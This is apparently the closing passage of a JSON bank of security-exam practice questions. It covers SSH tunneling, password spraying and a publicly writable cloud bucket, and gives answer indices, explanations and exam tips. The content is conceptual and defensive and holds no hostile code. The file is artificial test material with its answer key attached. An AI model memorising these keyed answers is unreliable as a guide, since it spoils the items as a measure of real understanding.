        "Deploy endpoint detection and response (EDR) tools on internal hosts",
        "Restrict SSH access to known IP ranges at the firewall level",
        "Implement multi-factor authentication (MFA) for SSH logins"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SSH tunneling often uses non-standard ports for internal access. Monitoring unusual SSH port activity helps detect such bypass attempts.",
      "examTip": "Track SSH traffic patterns—non-standard port usage or unexplained tunnels may indicate lateral movement or C2 activities."
    },
    {
      "id": 99,
      "question": "A SIEM alert shows multiple failed login attempts from the same IP address targeting different user accounts. The attempts are spread over several hours without triggering account lockouts.\n\nWhich attack type does this MOST LIKELY represent?",
      "options": [
        "Password spraying",
        "Credential stuffing",
        "Brute force attack",
        "Pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Password spraying attacks try commonly used passwords against many accounts at low frequencies to avoid detection and lockouts.",
      "examTip": "Enable account lockout policies and monitor login attempts for low-frequency attacks—classic signs of password spraying."
    },
    {
      "id": 100,
      "question": "A cloud audit reveals that a publicly accessible storage bucket allows write permissions. Shortly after, unauthorized files containing malicious JavaScript appear in the bucket.\n\nWhat is the MOST significant risk associated with this misconfiguration?",
      "options": [
        "Malware distribution through publicly accessible content",
        "Data exfiltration through cloud-based file uploads",
        "Privilege escalation via manipulation of cloud metadata",
        "Denial-of-service (DoS) by uploading large files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Public write access allows attackers to upload malicious content that can be served to users, potentially distributing malware or executing drive-by attacks.",
      "examTip": "Enforce least-privilege access controls on cloud storage—public write permissions should be avoided unless explicitly required."
    }
  ]
});
